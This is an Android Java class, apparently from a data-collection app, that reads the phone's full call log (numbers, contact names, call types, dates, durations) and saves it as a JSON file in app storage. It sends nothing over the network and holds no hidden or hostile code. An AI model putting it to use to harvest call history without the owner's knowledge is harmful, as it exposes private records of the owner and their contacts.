package com.alzahra.collector;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.FileWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class CallLogCollector {
    private final Context context;
    public CallLogCollector(Context context) { this.context = context; }

    public File export() {
        try {
            JSONArray callList = new JSONArray();
            Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            if (cursor == null) return null;
            try {
                SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
                while (cursor.moveToNext()) {
                    JSONObject call = new JSONObject();
                    call.put("number", cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER)));
                    call.put("name", cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME)));
                    int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    call.put("type", type == CallLog.Calls.INCOMING_TYPE ? "incoming" : type == CallLog.Calls.OUTGOING_TYPE ? "outgoing" : "missed");
                    call.put("date", sdf.format(new Date(cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE)))));
                    call.put("duration", cursor.getInt(cursor.getColumnIndex(CallLog.Calls.DURATION)));
                    callList.put(call);
                }
            } finally { cursor.close(); }
            if (callList.length() == 0) return null;
            File dir = new File(context.getFilesDir(), "exports");
            if (!dir.exists()) dir.mkdirs();
            File file = new File(dir, "calls_" + System.currentTimeMillis() + ".json");
            FileWriter writer = new FileWriter(file);
            writer.write(callList.toString(2));
            writer.close();
            return file;
        } catch (Exception e) { e.printStackTrace(); return null; }
    }
}
